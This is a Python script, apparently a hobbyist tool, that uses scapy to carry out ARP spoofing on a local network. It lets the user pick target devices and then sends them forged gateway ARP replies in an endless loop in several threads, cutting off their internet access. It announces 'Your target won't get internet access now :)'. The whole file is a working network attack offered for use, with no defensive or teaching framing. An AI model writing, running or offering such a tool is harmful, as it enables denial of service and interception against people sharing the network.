from scapy.all import *
import time 
import os 
from utils import get_info, get_ip, get_mac 
import threading

"""
need to increase efficiency of program.
#better ui
need to do code cleanup.
need to add an exiting condition for the program to close successfully.
need to add linux support
Build - 1.0.1
"""

def main():
    try:
        #start of the program
        print("[+] ARP Spoofer starting soon ... , press ctrl+c to stop.")
        time.sleep(3)
        os.system("cls")
        #get mac and gateway from user
        mm = str(input("[?] Enter your mac address (use ipconfig /all in terminal if you dont know about it!) - "))
        mm = mm.replace("-",":")
        gip  = str(input("[?] Enter gateway ip (default  - 192.168.0.1) - "))
        os.system("cls")

        #gets information about devices in network
        h = get_info()
        print("From the table....")
        print("\n")
        #n_instance = int(input("Enter number of runner-instance for the program (Number of devices you want to kcik off) :- "))
        
        #take target ids from user
        ids = str(input("[?] Enter the id(s) of your target(s) with a '&' in b/w two ids - "))
        ids = ids.split("&")

        def send_arp_pkt(my_mac , target_mac , gateway_ip , target_ip):
                flag = 0 # time sequence checker var
                #Creating of packets
                p1  =  Ether()
                p1.src  = my_mac
                p1.dst = target_mac


                p2 = ARP()
                p2.psrc =  gateway_ip
                p2.hwsrc =  my_mac
                p2.pdst =  target_ip
                p2.hwdst =  target_mac
                p2.op = 2 # operation code is 2
                t1 = time.time()
                
                pkt = p1/p2

                #sending unlimited ARP spoofer packet.
                while 1:
                    t2 = time.time()
                    sendp(pkt , verbose = False)
                    if(int(t2-t1)>=10 and flag == 0):
                        os.system("cls")
                        print(f"[!] Your target {p2.pdst} won't get internet access now :) (Continue the program to prevent access)\n")
                        flag = 1
                 

        def run(x):#Runner function which takes in ratget id
            try:
                global id , tm , tip
                id = int(x)
                tm = str(get_mac(h[id]))
                tip  = str(get_ip(h[id]))
                send_arp_pkt(mm, tm ,gip,tip)
            except  KeyboardInterrupt:
                exit(0)
            except Exception as e :
                print(e)


        threads = []#list of threads for the different instances of runner function.
        

        #creating threads for each instance of runner function
        for k in ids:
            t = threading.Thread(target=run , args=(k,))
            t.daemon = False
            threads.append(t)
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join()
        

    except KeyboardInterrupt:
        exit(0)
      
    except Exception as e:
        print(e) 
        time.sleep(4)
        exit(0)


if (__name__=="__main__"):
    main()
